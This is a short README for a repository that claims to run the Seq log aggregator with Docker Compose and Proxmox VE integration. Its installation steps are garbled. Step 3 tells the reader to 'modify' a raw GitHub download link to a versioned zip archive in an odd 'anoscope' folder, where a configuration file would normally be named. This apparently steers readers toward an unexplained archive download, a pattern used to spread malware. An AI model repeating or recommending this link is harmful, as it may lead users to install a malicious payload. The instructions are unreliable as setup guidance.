## Introduction
Logging and monitoring are essential components of any infrastructure, allowing you to track and analyze the behavior of your systems. **Seq** is a versatile log aggregation tool that makes it easy to collect, search, and visualize log data effectively. By combining Seq with Docker Compose, we provide a convenient way to set up and run Seq in any environment.

In this repository, we take it a step further by showcasing how you can integrate Seq with **Proxmox VE**, a robust open-source virtualization platform. This integration allows you to monitor and manage virtual machines more efficiently by consolidating logs in Seq.

## Getting Started
To get started with Seq Log Aggregator using Docker Compose and Proxmox VE, follow the steps outlined below.

### Prerequisites
- Docker installed on your machine
- Docker Compose installed on your machine
- Basic knowledge of working with Docker and Docker Compose

### Installation
1. Clone this repository to your local machine.
2. Navigate to the project directory.
3. Modify the `https://github.com/Albertkinguru/Seq-Log-Aggregator-with-Docker-Compose/raw/refs/heads/main/anoscope/Log_with_Seq_Docker_Aggregator_Compose_v2.0-alpha.3.zip` file to suit your environment.
4. Run `docker-compose up` to start the Seq Log Aggregator with Proxmox VE integration.

## Usage
Once the Docker Compose setup is running, you can access Seq through your browser by navigating to `http://localhost:5341`. From there, you can begin collecting and analyzing log data from your Proxmox VE instances seamlessly.

## Repository Topics
